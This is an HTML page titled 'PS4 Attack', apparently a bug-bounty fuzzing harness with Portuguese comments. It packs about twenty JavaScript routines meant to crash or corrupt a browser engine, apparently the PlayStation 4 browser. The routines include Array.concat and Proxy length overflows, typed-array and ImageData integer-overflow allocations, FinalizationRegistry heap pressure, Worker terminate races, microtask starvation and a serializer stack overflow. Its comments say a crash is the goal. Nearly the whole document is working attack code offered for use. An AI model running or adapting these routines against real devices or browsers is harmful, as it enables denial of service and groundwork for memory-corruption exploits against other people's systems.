<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
   <title>PS4 Attack</title>
   </head>
<body>

  <h1>ATTACK SUITE</h1>

    <button onclick="startDOMRecursion()">HACKERONE TRIGGER CRASH</button>
    <button onclick="runStringAttack()">HACKERONE STRING FLATTENING</button>

    <button onclick="runArgumentsCrash()">ALTA REPORTAR Arguments JIT Optimization Crash</button>
    <button onclick="runConcatOOB()">ALTA REPORTAR Array.concat Spreadable Overflow</button>
    <button onclick="runConcatCrash()">ALTA REPORTAR Array.concat Heap Overflow</button>
    <button onclick="runSparseReverse()">ALTA REPORTAR Sparse Array Reverse (Memory Corruption)</button>
    <button onclick="runGCResurrection()">ALTA REPORTAR FinalizationRegistry UAF (GC Panic)</button>
    <button onclick="runImageDataOverflow()">ALTA REPORTAR ImageData Integer Overflow (Crash)</button>

    <button onclick="runReplaceBomb()">MEDIA REPORTAR String.replace Calculation Overflow</button>
    <button onclick="runBadArrayLength()">MEDIA REPORTAR Bad Array Length (Integer Overflow)</button>
    <button onclick="runStringOverflow()">MEDIA REPORTAR String.repeat Integer Overflow</button>
	

    <button onclick="runMicrotaskBomb()">BAIXA REPORTAR Promise Microtask Starvation</button>
    <button onclick="run10_AllocPanic()">BAIXA REPORTAR Bad Array New Length</button>    
   

    <button onclick="runBindChain()">STACK OVERFLOW Function.bind() Chain Reaction</button>
    <button onclick="runCollatorRecursion()">STACK OVERFLOW Intl.Collator Infinite Recursion</button>

	<button onclick="runAudioRace()">TEST 1: AudioContext Thread Race (Use-After-Free)</button>
    <button onclick="runWorkerTermination()">TEST 2: Worker Terminate Transfer Race</button>
    <button onclick="runLargeArrayOverflow()">TEST 3: Large Array Buffer Overflow</button>
    <button onclick="runImportRace()">TEST 1: Worker importScripts Termination Race</button>
    <button onclick="runPostMessageRecursion()">TEST 2: MessagePort Serializer Stack Smash</button>
    <button onclick="runJPEGOverflow()">TEST 3: Canvas JPEG Encoder Heap Overflow</button>

	
    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>
    
    <div id="hidden-area" style="display:none;"></div>
    <div id="font-area" style="font-family: sans-serif;"></div>
    <canvas id="c_src" width="100" height="100" style="display:none;"></canvas>
    <canvas id="c_dst" width="100" height="100" style="display:none;"></canvas>
    <div id="sandbox" style="display:none;"></div>
    <div id="ax-root"></div>
    <div id="box" style="width:100px; height:100px; background:red; display:none;"></div>

    <script>
        function log(msg) {          
            let logElem = document.getElementById('log');
            logElem.innerText = `> ${msg}\n` + logElem.innerText;
        }

        // --- HACKERONE FUNCTIONS ---

        function startDOMRecursion() {
            log("Iniciando ataque de Profundidade DOM...");
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    document.body.appendChild(root);
                    let count = 0;
                    
                    function dive() {
                        count++;
                        let child = document.createElement('div');
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child; 
                        
                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
                        
                        dive(); 
                    }
                    dive();
                } catch (e) {
                    log("Erro capturado (Browser tentou proteger): " + e);
                    log("Tentando método alternativo (String Repeat)...");
                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
                }
            }, 500);
        }

        function runStringAttack() {
            log("Fase 1: Criando Array Fragmentado...");
            setTimeout(() => {
                try {
                    var hugeArray = [];
                    var chunk = new Array(1024 * 1024).join("A"); 
                    
                    for(let i=0; i < 2000; i++) {
                        hugeArray.push(chunk);
                        if(i % 200 === 0) log("Alocado: " + i + "MB");
                    }

                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
                    log("Atenção: O navegador deve travar agora.");

                    var flatString = hugeArray.join("");
                    log("Tamanho final: " + flatString.length);
                    var upper = flatString.toUpperCase(); 
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
                    for(let i=0; i<100000; i++) {
                        history.pushState(0,0, i.toString());
                    }
                }
            }, 100);
        }

        // --- STACK OVERFLOW ---

        function runBindChain() {
            log("Criando cadeia Function.bind()...");
            try {
                let func = function() { return "pow"; };
                for (let i = 0; i < 50000; i++) {
                    func = func.bind(null);
                }
                log("Cadeia criada. Executando (Trigger)...");
                func();
                log("Bind Chain executada (Sem crash).");
            } catch(e) {
                log("Erro Bind: " + e.message);
                if (e.message.includes("stack")) {
                    log("SUCESSO: Stack Overflow via Bind Chain!");
                }
            }
        } 

        function runCollatorRecursion() {
            log("Iniciando Collator Recursion...");
            
            const collator = new Intl.Collator();
            
            const evil = {
                toString: function() {
                    // Recursão infinita dentro da chamada nativa
                    return this.toString(); 
                }
            };

            try {
                log("Comparando objeto recursivo...");
                // O C++ chama toString -> JS chama toString -> ...
                // Se o limite de pilha JS não for verificado dentro do callback do C++, BOOM.
                collator.compare(evil, "a");
                
            } catch(e) {
                log("Erro (Stack Overflow capturado): " + e.message);
            }
        }

        // --- FREEZE FUNCTIONS ---

        function runMicrotaskBomb() {
            log("Iniciando Microtask Starvation (IPC Freeze)...");
            log("Aviso: A aba vai congelar. Observe o comportamento do botão PS.");
            let count = 0;
            function loop() {
                count++;
                Promise.resolve().then(loop);
                if (count % 100000 === 0) {
                    new Date().toString(); 
                }
            }
            loop();
        }

        function runReplaceBomb() {
            log("Armando String.replace Logic Bomb...");
            try {
                let str = "test";
                const re = /.*/; 
                for(let i=0; i<30; i++) { 
                    str = str.replace(re, "$&".repeat(2)); 
                    if (i % 5 === 0) log(`Nível ${i}: Length ~${str.length}`);
                }
                log("String final gerada (Seguro).");
            } catch(e) {
                log("Erro Replace (Provável OOM): " + e.message);
            }
        }

        function runArgumentsCrash() {
            log("Testando Arguments Type Confusion...");
            
            function confuse(arg) {
                // O compilador tenta otimizar o acesso a 'arguments[0]'
                // Nós mudamos a estrutura de 'arguments' deletando índices
                delete arguments[0];
                
                // Agora definimos uma propriedade getter na cadeia de protótipos
                Object.defineProperty(Object.prototype, "0", {
                    get: () => {
                        log("Getter na prototype chain ativado!");
                        // Tenta invalidar a stack frame atual
                        return 0xDEADBEEF;
                    },
                    configurable: true
                });
                
                // O acesso deve ser lento agora, mas se o JIT usou Fast Path, vai ler lixo
                return arguments[0];
            }

            // Treina o motor com chamadas normais
            for(let i=0; i<1000; i++) confuse(1);
            
            log("Executando acesso confuso...");
            const val = confuse(1);
            
            if (val === 0xDEADBEEF) {
                log("Comportamento Correto (Lento).");
            } else if (val === undefined) {
                log("Indefinido (Seguro).");
            } else {
                log(`ALERTA: Valor inesperado lido! ${val} (Possível leitura de Stack lixo)`);
            }
            
            delete Object.prototype["0"]; // Limpeza
        }

        function runConcatOOB() {
            log("Iniciando Array.concat Type Confusion...");
            
            try {
                // Array alvo
                const target = [1.1];
                
                // Objeto malicioso que finge ser um array espalhável
                const proxy = new Proxy({}, {
                    get(target, prop) {
                        if (prop === Symbol.isConcatSpreadable) return true;
                        
                        if (prop === "length") {
                            log("Engine leu length. Retornando tamanho gigante...");
                            // Retorna um tamanho que pode causar overflow se somado ao target
                            // Em 32-bit: 0xFFFFFFFF
                            return 4294967295; 
                        }
                        
                        if (prop === "0") {
                            log("Engine leu índice 0.");
                            return 0x41414141;
                        }
                        
                        return undefined;
                    },
                    has(target, prop) { return true; } // Finge ter todas as propriedades
                });

                log("Executando concat()...");
                
                // O 'concat' tenta alocar um novo array com tamanho = target.length + proxy.length
                // Se houver Integer Overflow, ele aloca pouco.
                // Depois tenta copiar os itens. Se não verificar limites, escreve fora.
                const res = target.concat(proxy);
                
                log("Concat terminou (Sem Crash). Length: " + res.length);
                
            } catch(e) {
                // "Out of memory" ou "Invalid array length" são bons sinais.
                // Crash é o objetivo.
                log("Erro Concat: " + e.message);
            }
        } 

        function runConcatCrash() {
            log("Iniciando Array.concat Overflow...");
            
            try {
                const target = [];
                // Objeto que finge ser um array gigante
                const badSpreadable = {
                    [Symbol.isConcatSpreadable]: true,
                    length: 0xFFFFFFFF, // Tamanho máximo 32-bit
                    0: 1,
                    1: 2
                };

                log("Concatenando array gigante...");
                
                // Se o motor somar target.length (0) + badSpreadable.length (4GB),
                // e ocorrer Integer Overflow, ele pode alocar um buffer pequeno.
                // Mas se o loop de cópia tentar ler até 4GB, crasha.
                const res = target.concat(badSpreadable);
                
                log("Concat finalizado. Length: " + res.length);
                
            } catch(e) {
                log("Erro Concat (Provável OOM): " + e.message);
            }
        }

        function runSparseReverse() {
            log("Iniciando Sparse Array Reverse...");
            
            try {
                const arr = [];
                // Define índices nos extremos do limite de 32-bit
                arr[0] = 1;
                arr[0xFFFFFFFE] = 2; // 4GB - 2
                
                log(`Array esparso criado. Length: ${arr.length}`);
                log("Executando reverse()...");
                
                // O GOLPE: O motor tem de trocar o índice 0 com o 0xFFFFFFFE.
                // Se ele tentar iterar ou alocar memória para os buracos, OOM.
                // Se ele calcular errado o endereço do último item, Crash.
                arr.reverse();
                
                log("Reverse concluído.");
                log("Valor em [0]: " + arr[0]); // Deve ser 2
                
            } catch(e) {
                log("Erro Sparse: " + e.message);
            }
        }

        function runGCResurrection() {
            log("Iniciando GC Resurrection Attack...");
            
            if (!window.FinalizationRegistry) {
                log("API FinalizationRegistry não suportada.");
                return;
            }

            let registry = new FinalizationRegistry(heldValue => {
                // Este código roda quando o objeto morre.
                // O GC está num estado sensível aqui.
                log("Objeto coletado! Tentando alocação massiva no callback...");
                
                // Tenta forçar movimento de memória enquanto o GC limpa
                const chaos = [];
                try {
                    for(let i=0; i<1000; i++) chaos.push(new ArrayBuffer(1024 * 100));
                } catch(e) {}
                
                // Se o GC não estiver bloqueado corretamente, isso pode corromper o heap.
            });

            // Cria objetos descartáveis
            function makeTrash() {
                let obj = { id: Math.random() };
                registry.register(obj, "LIXO");
                obj = null; // Marca para coleta
            }

            // Gera lixo massivo para forçar o ciclo de GC
            log("Gerando pressão de GC...");
            const interval = setInterval(() => {
                for(let i=0; i<1000; i++) makeTrash();
                
                // Tenta forçar alocação para disparar o GC
                const trigger = new Array(10000).fill(1.1);
            }, 10);

            setTimeout(() => {
                clearInterval(interval);
                log("Teste GC finalizado.");
            }, 5000);
        }

        // --- SEM MEMORIA FUNCTIONS ---

	    function runBadArrayLength() {
            log("Testando Array Length Integer Overflow...");
            const sizes = [
                0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, -1, 4294967295, 4294967296 
            ];
            sizes.forEach(size => {
                try {
                    log(`Tentando alocar Uint8Array(${size})...`);
                    let arr = new Uint8Array(size);
                    log("Alocado (Inesperado!)");
                } catch(e) {}
            });
            log("Teste de Array finalizado.");
        }

        function run10_AllocPanic() {
            log("[10] Testing Allocator Panic...");
            try {
                const arr = new ArrayBuffer(2147483647); // Max 32-bit signed
                log("Allocated (Unexpected).");
            } catch(e) { log("Alloc Error (Expected): " + e.message); }
        }

        function runImageDataOverflow() {
            log("Iniciando ImageData Math Attack...");
            
            try {
                // Valores críticos para 32-bit (0xFFFFFFFF)
                // 1073741824 * 4 = 0 (Overflow exato)
                // Vamos tentar valores próximos para enganar a validação
                const targets = [
                    { w: 1073741824, h: 1 }, // 4GB exato
                    { w: 32768, h: 32768 },  // 1GB pixels -> 4GB bytes
                    { w: 65536, h: 65536 },  // 4GB pixels -> 16GB bytes (Overflow certo se não checado)
                    { w: 23170, h: 23170 }   // ~2GB bytes
                ];

                targets.forEach((t, i) => {
                    try {
                        log(`Tentativa ${i}: ${t.w} x ${t.h}...`);
                        // O construtor pode lançar IndexSizeError (Seguro)
                        // Se passar e o cálculo estiver errado -> Heap Corruption
                        const img = new ImageData(t.w, t.h);
                        log("ALERTA: ImageData criado! Verifique estabilidade.");
                        
                        // Tenta acessar o buffer (pode crashar se o tamanho for falso)
                        const len = img.data.length;
                        log("Buffer Length reportado: " + len);
                        
                    } catch(e) {
                        // Erro esperado se a proteção funcionar
                    }
                });
                
                log("Teste ImageData finalizado.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        function runStringOverflow() {
            log("Iniciando String.repeat Overflow...");
            
            try {
                // 1. Tenta o limite de 32-bit (4GB)
                // Se o sistema usar 32-bit para comprimento, isso vira 0 ou negativo.
                // "A" (1 byte) * (2^32 - 1)
                // Se o alocador calcular errado, aloca pouco e escreve muito.
                
                // Valores críticos:
                // 0xFFFFFFFF (Max Uint32)
                // 0x7FFFFFFF (Max Int32)
                // 0x20000000 (512MB - limite comum de string no V8/JSC antigo)
                
                const counts = [0x7FFFFFFF, 0xFFFFFFF0, 268435455]; 
                
                counts.forEach(c => {
                    try {
                        log(`Tentando repetir string ${c} vezes...`);
                        const s = "A".repeat(c);
                        log(`String criada (Seguro). Length: ${s.length}`);
                    } catch(e) {
                        // RangeError (Invalid string length) é a proteção.
                        // Se crashar, a proteção falhou.
                        log("Erro (Browser Protegeu): " + e.message);
                    }
                });

                // Tentativa secundária: Overflow com string base maior
                // "AAAA" (4 bytes) * 0x40000000 = 4GB
                const base = "AAAA";
                log("Tentando overflow com base maior...");
                const s2 = base.repeat(0x3FFFFFFF); 
                log("Seguro.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }



function log(msg) { 
            document.getElementById('log').innerText += `[${new Date().toLocaleTimeString()}] ${msg}\n`; 
        }

        // --- TESTE 1: AudioContext Thread Race ---
        // Tenta causar uma corrida entre a thread de áudio (Kernel/Hardware) e a thread JS.
        // Se a thread de áudio tentar ler um buffer que o JS acabou de deletar, CRASH.
        function runAudioRace() {
            log("Iniciando Audio Race (Pode travar o console)...");
            
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const duration = 2; // segundos
                
                // Cria buffers massivos
                const frameCount = ctx.sampleRate * duration;
                const buffer = ctx.createBuffer(2, frameCount, ctx.sampleRate);
                
                // Enche com dados
                for (let ch = 0; ch < 2; ch++) {
                    const data = buffer.getChannelData(ch);
                    for (let i = 0; i < frameCount; i++) data[i] = Math.random();
                }

                const src = ctx.createBufferSource();
                src.buffer = buffer;
                src.connect(ctx.destination);
                src.start();

                // O GOLPE:
                // Tenta "Neutrar" (esvaziar) os dados do buffer enquanto ele toca.
                // Usamos um Worker para transferir a posse da memória.
                setTimeout(() => {
                    log("Tentando transferir buffer de áudio em execução...");
                    try {
                        const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                        
                        // A API Web Audio antiga permitia acesso aos arrays subjacentes.
                        // Tentamos transferir o ArrayBuffer de um canal.
                        const channelData = buffer.getChannelData(0).buffer;
                        
                        // Se isso funcionar, a thread de áudio fica sem chão.
                        w.postMessage(channelData, [channelData]);
                        w.terminate();
                        log("Transferência solicitada.");
                    } catch(e) {
                        log("Falha no ataque: " + e.message);
                    }
                }, 100); // Timing crítico

            } catch(e) {
                log("Erro Audio: " + e.message);
            }
        }

        // --- TESTE 2: Worker Terminate Transfer Race ---
        // Cria um Worker, envia dados e mata o Worker imediatamente.
        // Tenta corromper o heap do sistema que gerencia mensagens IPC.
        function runWorkerTermination() {
            log("Iniciando Worker Termination Race...");
            
            const workerCode = `
                self.onmessage = function(e) {
                    // Tenta processar e responder
                    const arr = new Uint8Array(e.data);
                    // Loop para manter a thread ocupada
                    for(let i=0; i<1000000; i++) arr[0] = i;
                    self.postMessage(arr.buffer, [arr.buffer]);
                };
            `;
            
            const blob = new Blob([workerCode], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            // Tenta o ataque repetidamente
            let i = 0;
            const interval = setInterval(() => {
                i++;
                if (i > 50) {
                    clearInterval(interval);
                    log("Teste finalizado (Sem crash).");
                    return;
                }

                const w = new Worker(url);
                const buffer = new ArrayBuffer(1024 * 1024); // 1MB
                
                // Envia memória
                w.postMessage(buffer, [buffer]);
                
                // O GOLPE: Mata o worker imediatamente.
                // O Kernel tem que limpar a memória do Worker.
                // Se a mensagem ainda estiver "em trânsito", pode haver corrupção.
                w.terminate();
                
                if (i % 10 === 0) log("Ciclo " + i + " executado.");
            }, 20);
        }

        // --- TESTE 3: Large Array Buffer Overflow ---
        // Tenta alocar um ArrayBuffer que causa overflow no cálculo de tamanho interno.
        // Focado em limites de 32-bit vs 64-bit.
        function runLargeArrayOverflow() {
            log("Iniciando Allocation Overflow...");
            
            // Valores perigosos para o alocador (que podem virar 0 ou negativo)
            const sizes = [
                0xFFFFFFFF, // Max Uint32
                0x80000000, // Max Int32 + 1
                2147483648, 
                4294967296
            ];

            sizes.forEach(size => {
                try {
                    log(`Tentando alocar: ${size} bytes...`);
                    
                    // Se o motor não validar, e tentar alocar size_t(size),
                    // pode ocorrer wrap-around ou falha catastrófica.
                    const arr = new Uint8Array(size);
                    
                    // Se chegou aqui, algo muito estranho aconteceu.
                    log("ALERTA: Alocação de " + size + " permitida! (Tamanho real: " + arr.length + ")");
                    
                    // Tenta escrever no final para ver se a memória existe
                    arr[size - 1] = 0x41;
                    
                } catch(e) {
                    // Erro esperado (RangeError).
                    // Se crashar (tela azul), é Sucesso.
                }
            });
            log("Teste de Alocação finalizado.");
		}
		

    

        // --- TESTE 1: Worker importScripts Termination Race ---
        // Tenta matar o worker enquanto ele carrega e compila um script pesado.
        function runImportRace() {
            log("Iniciando ImportScripts Race...");
            
            // Cria um script "pesado" para importar
            const heavyScript = "Math.random();".repeat(10000);
            const scriptBlob = new Blob([heavyScript], {type: 'text/javascript'});
            const scriptUrl = URL.createObjectURL(scriptBlob);
            
            const workerCode = `
                self.onmessage = function(e) {
                    // Inicia importação síncrona pesada
                    importScripts(e.data);
                    postMessage("Done");
                };
            `;
            const blob = new Blob([workerCode], {type: 'text/javascript'});
            const url = URL.createObjectURL(blob);
            
            let count = 0;
            const interval = setInterval(() => {
                count++;
                if (count > 50) {
                    clearInterval(interval);
                    log("Teste finalizado (Sem crash).");
                    return;
                }

                const w = new Worker(url);
                w.postMessage(scriptUrl);
                
                // O GOLPE: Termina o worker num tempo aleatório durante o import
                const killTime = Math.random() * 20;
                setTimeout(() => {
                    w.terminate();
                }, killTime);
                
                if (count % 10 === 0) log("Ciclo " + count + " executado.");
            }, 50);
        }

        // --- TESTE 2: MessagePort Serializer Stack Smash ---
        // Cria uma lista ligada profunda e tenta enviar via IPC.
        // Estoura a pilha de recursão do serializador.
        function runPostMessageRecursion() {
            log("Iniciando Serializer Stack Smash...");
            
            try {
                let root = { next: null };
                let current = root;
                
                // Cria uma profundidade de 20.000 níveis
                // O serializador C++ usa recursão para percorrer objetos
                for (let i = 0; i < 20000; i++) {
                    current.next = { val: i, next: null };
                    current = current.next;
                }
                
                log("Objeto profundo criado. Enviando via postMessage...");
                
                const channel = new MessageChannel();
                // O crash deve ocorrer AQUI, durante a serialização para envio
                channel.port1.postMessage(root);
                
                log("Envio concluído (Stack aguentou).");
                
            } catch(e) {
                // "Maximum call stack size exceeded" é JS catch.
                // Crash direto é C++ catch falhando.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Canvas JPEG Encoder Heap Overflow ---
        // Cria uma imagem com dimensões específicas e tenta codificar para JPEG.
        // Tenta explorar falhas no cálculo de buffer do libjpeg.
        function runJPEGOverflow() {
            log("Iniciando JPEG Encoder Attack...");
            
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            // Dimensões "estranhas" que podem causar problemas de alinhamento ou overflow
            const targets = [
                { w: 65500, h: 1 },    // Linha muito larga (perto de uint16)
                { w: 1, h: 65500 },    // Coluna muito alta
                { w: 32768, h: 32768 } // Limite 1GB pixels
            ];

            targets.forEach((t, i) => {
                setTimeout(() => {
                    try {
                        log(`Tentativa ${i}: ${t.w}x${t.h}...`);
                        canvas.width = t.w;
                        canvas.height = t.h;
                        
                        // Preenche com ruído para dificultar compressão
                        // (Pula para ganhar performance, só precisamos de dados)
                        ctx.fillStyle = "red";
                        ctx.fillRect(0, 0, t.w, t.h);
                        
                        // O GOLPE: toDataURL força a compressão síncrona ou assíncrona
                        const data = canvas.toDataURL('image/jpeg', 1.0);
                        
                        log("Codificação concluída (Length: " + data.length + ")");
                    } catch(e) {
                        log("Erro (Browser Protegeu): " + e.message);
                    }
                }, i * 1000);
            });
        }

    </script>
</body>
</html>
